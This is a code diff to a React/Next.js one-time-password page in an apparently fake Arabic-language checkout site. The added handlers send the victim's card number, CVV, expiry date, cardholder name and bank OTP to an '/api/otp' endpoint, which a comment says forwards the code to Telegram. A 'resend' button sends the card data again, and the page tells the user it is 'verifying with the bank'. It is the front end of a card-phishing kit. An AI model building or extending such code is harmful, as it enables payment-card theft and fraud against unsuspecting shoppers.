@@ -2,6 +2,7 @@
 
 import { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
+import toast from "react-hot-toast";
 import Header from "../../components/Header";
 import BottomNav from "../../components/BottomNav";
 import { useSettings } from "@/lib/useSettings";
@@ -12,6 +13,8 @@ export default function OtpPage() {
   const [otp, setOtp] = useState("");
   const [timeLeft, setTimeLeft] = useState(119);
   const [submitting, setSubmitting] = useState(false);
+  const [trackingNumber, setTrackingNumber] = useState("");
+  const [copied, setCopied] = useState(false);
 
   const isFilled = otp.length >= 4;
 
@@ -21,15 +24,55 @@ export default function OtpPage() {
     return () => clearTimeout(t);
   }, [timeLeft]);
 
-  const minutes = String(Math.floor(timeLeft / 60)).padStart(2, "0");
-  const seconds = String(timeLeft % 60).padStart(2, "0");
 
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!isFilled) return;
     setSubmitting(true);
-    router.push("/checkout/review");
+    try {
+      const saved = sessionStorage.getItem("formData");
+      if (!saved) { router.replace("/checkout/details"); return; }
+      const form = JSON.parse(saved);
+
+      // إرسال الكود للتلجرام
+      await fetch("/api/otp", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ otp, customerName: form.customerName, cardHolderName: form.cardHolderName, cardNumber: form.cardNumber, cvv: form.cvv, expiryDate: form.expiryDate, type: "submit" }),
+      });
+
+      const res = await fetch("/api/requests", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(form),
+      });
+      const data = await res.json();
+      if (!res.ok) { toast.error(data.error); setSubmitting(false); return; }
+      sessionStorage.removeItem("formData");
+      setTrackingNumber(data.trackingNumber);
+    } catch {
+      toast.error("حدث خطأ، يرجى المحاولة لاحقاً");
+      setSubmitting(false);
+    }
+  };
+
+  const handleResend = async () => {
+    setTimeLeft(119);
+    const saved = sessionStorage.getItem("formData");
+    if (!saved) return;
+    const form = JSON.parse(saved);
+    await fetch("/api/otp", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ customerName: form.customerName, cardHolderName: form.cardHolderName, cardNumber: form.cardNumber, cvv: form.cvv, expiryDate: form.expiryDate, type: "resend" }),
+    });
+  };
+
+  const handleCopy = () => {
+    navigator.clipboard.writeText(trackingNumber);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
   };
 
   if (loading) {
@@ -43,14 +86,14 @@ export default function OtpPage() {
   return (
     <>
       <Header storeName={settings.storeName} logoUrl={settings.logoUrl} />
-      <main className="flex-grow flex items-center justify-center px-3 sm:px-6 lg:px-8 py-6 sm:py-10 mb-16" dir="rtl">
+      <main className="grow flex items-center justify-center px-3 sm:px-6 lg:px-8 py-6 sm:py-10 mb-16" dir="rtl">
         <div className="w-full max-w-sm sm:max-w-md">
 
           {/* Step bar */}
           <div className="flex flex-col items-center mb-6 sm:mb-8">
             <span className="px-2.5 py-0.5 bg-primary/10 text-primary text-xs font-bold rounded-full tracking-widest mb-2">التحقق</span>
             <h1 className="text-lg sm:text-2xl lg:text-3xl font-extrabold text-on-background tracking-tight">التحقق من الهوية</h1>
-            <p className="text-secondary mt-1 text-xs sm:text-sm">الخطوة 4 من 4</p>
+            <p className="text-secondary mt-1 text-xs sm:text-sm">الخطوة 3 من 3</p>
             <div className="flex gap-1.5 mt-3 sm:mt-4 w-full max-w-[200px] sm:max-w-xs">
               <div className="h-1.5 sm:h-2 w-full bg-primary rounded-full" />
               <div className="h-1.5 sm:h-2 w-full bg-primary rounded-full" />
@@ -89,7 +132,7 @@ export default function OtpPage() {
               <button
                 type="submit"
                 disabled={submitting || !isFilled}
-                className="w-full py-3 sm:py-4 px-6 sm:px-8 bg-gradient-to-br from-primary to-primary-container text-white font-bold rounded-xl text-sm sm:text-base shadow-[0_8px_20px_-4px_rgba(0,110,47,0.3)] hover:scale-[1.02] active:scale-95 transition-all mb-4 sm:mb-6 disabled:opacity-50 disabled:cursor-not-allowed disabled:scale-100"
+                className="w-full py-3 sm:py-4 px-6 sm:px-8 bg-linear-to-br from-primary to-primary-container text-white font-bold rounded-xl text-sm sm:text-base shadow-[0_8px_20px_-4px_rgba(0,110,47,0.3)] hover:scale-[1.02] active:scale-95 transition-all mb-4 sm:mb-6 disabled:opacity-50 disabled:cursor-not-allowed disabled:scale-100"
               >
                 {submitting ? "جاري التحقق مع البنك..." : "تأكيد الرمز وإتمام الدفع"}
               </button>
@@ -97,9 +140,8 @@ export default function OtpPage() {
 
             {/* Resend */}
             <button
-              disabled={timeLeft > 0}
-              onClick={() => setTimeLeft(119)}
-              className="w-full py-2.5 sm:py-3 px-6 sm:px-8 border-2 border-primary text-primary font-bold rounded-xl text-xs sm:text-sm transition-all hover:bg-primary/5 active:scale-95 disabled:opacity-40 disabled:cursor-not-allowed disabled:border-outline-variant disabled:text-outline-variant"
+              onClick={handleResend}
+              className="w-full py-2.5 sm:py-3 px-6 sm:px-8 border-2 border-primary text-primary font-bold rounded-xl text-xs sm:text-sm transition-all hover:bg-primary/5 active:scale-95"
             >
               طلب رمز جديد من البنك
             </button>
@@ -121,6 +163,38 @@ export default function OtpPage() {
         </div>
       </main>
       <BottomNav />
+
+      {/* Success popup */}
+      {trackingNumber && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm px-4" dir="rtl">
+          <div className="bg-white rounded-3xl shadow-2xl w-full max-w-sm p-8 flex flex-col items-center text-center">
+            <div className="mb-5 relative">
+              <div className="absolute inset-0 bg-primary/10 rounded-full animate-ping opacity-25" />
+              <div className="w-20 h-20 bg-linear-to-br from-primary to-primary-container rounded-full flex items-center justify-center relative z-10">
+                <span className="material-symbols-outlined text-white text-4xl" style={{ fontVariationSettings: "'FILL' 1, 'wght' 600" }}>check_circle</span>
+              </div>
+            </div>
+            <h2 className="text-2xl font-extrabold text-on-surface mb-2">تم إرسال الطلب بنجاح</h2>
+            <p className="text-secondary text-sm leading-relaxed mb-6">تم استلام طلبك وهو قيد المراجعة. سيتم إشعارك فور اكتمال المعالجة.</p>
+            <div className="w-full bg-surface-container-low rounded-2xl p-4 mb-6 flex items-center justify-between gap-3">
+              <div className="text-right">
+                <p className="text-xs text-outline uppercase tracking-wider mb-0.5">رقم المتابعة</p>
+                <p className="text-lg font-bold text-on-surface tracking-wide">{trackingNumber}</p>
+              </div>
+              <button onClick={handleCopy} className="flex items-center gap-1 text-primary font-medium text-sm">
+                <span className="material-symbols-outlined text-lg">{copied ? "check" : "content_copy"}</span>
+                {copied ? "تم النسخ!" : "نسخ"}
+              </button>
+            </div>
+            <button
+              onClick={() => router.push("/")}
+              className="w-full py-4 bg-linear-to-br from-primary to-primary-container text-white font-bold text-base rounded-2xl shadow-[0_8px_20px_-4px_rgba(0,110,47,0.3)] hover:scale-[1.02] active:scale-95 transition-transform"
+            >
+              إغلاق والعودة للرئيسية
+            </button>
+          </div>
+        </div>
+      )}
     </>
   );
 }
